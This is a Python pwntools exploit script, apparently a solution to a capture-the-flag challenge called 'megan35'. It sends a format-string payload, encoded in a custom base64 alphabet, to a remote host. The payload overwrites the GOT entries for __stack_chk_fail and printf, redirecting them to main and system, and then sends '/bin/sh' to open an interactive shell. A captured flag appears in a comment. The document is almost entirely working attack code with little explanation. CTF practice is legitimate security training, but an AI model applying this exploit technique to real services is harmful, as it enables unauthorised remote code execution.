from pwn import *

import base64
import binascii


#flag{43eb404b714b8d22e1168775eba1669c}

char_megan35 = "3GHIJKLMNOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5"
char_base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
char_map = dict(zip(char_base64, char_megan35))

def m35encode(s):
    b = base64.b64encode(s)
    return ''.join([char_map[x] for x in b])

libc = ELF('libc.so.6')
host = "megan35.stillhackinganyway.nl"
port = 3535

r = remote(host,port)
#r=process('./babyecho')

#----dump printf addr
printf_got = 0x804A00C
#r.recvuntil('encryption.\n')
#payload = p32(printf_got)

#dereference by %s
#payload+='%p'*70+'--'+'%s'

#r.sendline(m35encode(payload))

#convert the last 4byte to hex
#printf_addr=int(r.recv(1024).split('--')[-1][:4][::-1].encode('hex'),16)

#print 'printf addr: '+hex(printf_addr)
printf_addr_=0xf7e62020
#system = printf_addr_ - libc.symbols['printf'] + libc.symbols['system']

#print 'addr: '+hex(system)
#-----------------

#r.interactive()
#log.info("system: " + hex(system))
#r.close()
#system=printf-libc.symbols["printf"]+libc.symbols["system"]

#saved in offset 71
#canary is in 135

main=0x080484E0
printf_got = 0x804A00C
stack_check_fail_got = 0x0804a018
printf_addr_=0xf7e62020
system_server=0xf7e53940


#Step 1 write stack chk fail to main
payload =p32(stack_check_fail_got)
payload+=p32(stack_check_fail_got+1)
payload+=p32(stack_check_fail_got+2)
payload+=p32(stack_check_fail_got+3)
#Step 2 write printf to system
payload+=p32(printf_got)
payload+=p32(printf_got+1)
payload+=p32(printf_got+2)
payload+=p32(printf_got+3)

#test arg 139
#0xffffddd0-0x34
payload+=p32(0xffffdd9c)

fmt= '%188c%71$hhn'# 0xe0-36=
fmt+='%164c%72$hhn'# 0x84-0xe0=
fmt+='%128c%73$hhn'# 0x04-0x84=
fmt+='%4c%74$hhn'# 0x08-0x04

#system_server=0xf7e53940

fmt+='%56c%75$hhn'# 0x40-0x08=
fmt+='%249c%76$hhn'# 0x39-0x40=
fmt+='%172c%77$hhn'# 0xe5-0x39=
fmt+='%18c%78$hhn'  # 0xf7-0xe5=

#9 write canary
fmt+='%11c%79$hhn'

payload_=payload+fmt

r.recvuntil('encryption.\n')
#test='%139$x'
r.sendline(m35encode(payload_))


r.sendline(m35encode('/bin/sh'))




r.interactive()


#length of payload=16





